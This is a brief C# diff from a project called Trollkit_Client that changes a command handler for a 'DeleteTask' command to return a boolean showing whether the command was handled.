@@ -10,13 +10,17 @@ namespace Trollkit_Client.Modules.CommandHandlers
 {
     public class TaskHandler : ICommandHandler
     {
-        public void HandleCommand(TransferCommandObject obj)
+        public bool HandleCommand(TransferCommandObject obj)
         {
             if(obj.Command == "DeleteTask")
             {
                 TaskSchedulerHelper tsk = new TaskSchedulerHelper();
                 tsk.DeleteTask();
+
+				return true;
             }
-        }
+
+			return false;
+		}
     }
 }
